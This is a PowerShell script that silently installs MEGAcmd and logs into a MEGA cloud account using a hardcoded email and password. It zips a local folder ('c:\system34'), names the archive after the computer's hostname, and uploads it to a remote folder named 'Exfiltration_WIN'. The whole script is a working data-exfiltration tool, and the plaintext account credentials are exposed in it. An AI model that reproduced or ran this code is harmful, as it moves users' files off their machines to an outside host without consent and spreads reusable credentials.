# Function to download and install MEGAcmd in the current directory
function Install-MEGAcmd {
    $url64bit = "https://mega.nz/MEGAcmdSetup64.exe"
    $currentDirectory = $PSScriptRoot  # Use the current directory where the script is located
    $installerPath = [System.IO.Path]::Combine($currentDirectory, "MEGAcmdSetup.exe")

    Write-Host "Downloading MEGAcmd installer from $url64bit..." -ForegroundColor Cyan
    try {
        Invoke-WebRequest -Uri $url64bit -OutFile $installerPath
    }
    catch {
        Write-Error "Failed to download MEGAcmd installer from $url64bit. Error: $_"
        Exit
    }

    # Check if the installer file exists
    if (-not (Test-Path -Path $installerPath -PathType Leaf)) {
        Write-Error "MEGAcmd installer not found at $installerPath."
        Exit
    }

    Write-Host "Installing MEGAcmd from $installerPath..." -ForegroundColor Cyan
    try {
        Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait -PassThru
    }
    catch {
        Write-Error "Failed to install MEGAcmd from $installerPath. Error: $_"
        Exit
    }

    # Clean up installer
    Remove-Item $installerPath -Force
}

# Function to ensure MEGAcmd is in PATH
function Set-MEGAcmdPath {
    # Check common installation paths for MEGAcmd
    $possiblePaths = @(
        "C:\Program Files\MEGAcmd",
        "C:\Program Files (x86)\MEGAcmd",
        "$env:LOCALAPPDATA\MEGAcmd"
    )

    foreach ($path in $possiblePaths) {
        if (Test-Path $path) {
            $env:PATH += ";$path"
            Write-Host "MEGAcmd path added to PATH: $path" -ForegroundColor Green
            return $true
        }
    }

    Write-Error "MEGAcmd not found. Please install MEGAcmd."
    return $false
}

# Check if MEGAcmd is already installed
if (-not (Get-Command "mega-whoami" -ErrorAction SilentlyContinue)) {
    Write-Host "MEGAcmd is not installed. Installing now..." -ForegroundColor Yellow
    # MEGAcmd not found, proceed with installation
    Install-MEGAcmd
}

# Set MEGAcmd path
if (-not (Set-MEGAcmdPath)) {
    Write-Error "Failed to set MEGAcmd path."
    Exit
}

# Wait for a moment after installation
Start-Sleep -Seconds 2

# Predefined credentials
$username = "sisabasactivity@outlook.com"
$password = "Sisa@123"

# Ensure fresh login by logging out from any existing session (if needed)
try {
    mega-logout  # Attempt to log out from any existing session
    Write-Host "Logged out from any existing session." -ForegroundColor Green
}
catch {
    Write-Warning "No existing session found to log out." -ForegroundColor Yellow
}

# Log in with predefined credentials
try {
    mega-login $username $password
    Write-Host "Logged in successfully as $username." -ForegroundColor Green
}
catch {
    Write-Error "Failed to login with credentials $username."
    Exit
}

# Verify login by checking who the current user is
try {
    $UserEmailPre = mega-whoami
    Write-Host "Logged in as: $UserEmailPre" -ForegroundColor Green
}
catch {
    Write-Error "Failed to verify current user."
    Exit
}

# Detect and zip the folder
$documentsPath = "c:\system34"
if (-not (Test-Path -Path $documentsPath -PathType Container)) {
    Write-Warning "The directory $documentsPath does not exist. Creating it..." -ForegroundColor Yellow
    try {
        New-Item -Path $documentsPath -ItemType Directory -ErrorAction Stop
    }
    catch {
        Write-Error "Failed to create directory $documentsPath. Error: $_"
        Exit
    }
}
else {
    Write-Host "Using existing directory: $documentsPath" -ForegroundColor Green
}

# Get hostname of the machine
$hostname = $env:COMPUTERNAME
$zipFileName = "$hostname.zip"
$zipFilePath = [System.IO.Path]::Combine($PSScriptRoot, $zipFileName)

# Check if file already exists, add "_1" if it does
$counter = 1
while (Test-Path -Path $zipFilePath) {
    $zipFilePath = [System.IO.Path]::Combine($PSScriptRoot, "$hostname" + "_$counter.zip")
    $counter++
}

Write-Host "Zipping files from: $documentsPath" -ForegroundColor Yellow
Write-Host "Saving zip file to: $zipFilePath" -ForegroundColor Yellow
try {
    # Zip the folder
    Compress-Archive -Path $documentsPath\* -DestinationPath $zipFilePath
    Write-Host "Successfully zipped the folder: $zipFilePath" -ForegroundColor Green
}
catch {
    Write-Error "Failed to zip the folder. Error: $_"
    Exit
}

# Ensure MEGA's Exfiltration folder exists
$uploadFolder = "Exfiltration_WIN"
$remoteFolder = mega-mkdir $uploadFolder -ErrorAction SilentlyContinue

# Upload the zip file
Write-Host "Uploading $zipFilePath to MEGA folder $uploadFolder" -ForegroundColor Yellow
try {
    mega-put -q $zipFilePath $uploadFolder
    Write-Host "Successfully uploaded $zipFilePath to MEGA." -ForegroundColor Green
}
catch {
    Write-Error "Failed to upload $zipFilePath to MEGA. Error: $_"
}

# Display current transfers and their upload progress
Do {
    $isMegaEmpty = mega-transfers --only-uploads
    Write-Host $isMegaEmpty
} While (![string]::IsNullOrEmpty($isMegaEmpty))

#Logout
try {
    mega-logout  # Attempt to log out from any existing session
    Write-Host "Logged out from any existing session." -ForegroundColor Green
}
catch {
    Write-Warning "No existing session found to log out." -ForegroundColor Yellow
}

Write-Host "Process completed successfully." -ForegroundColor Green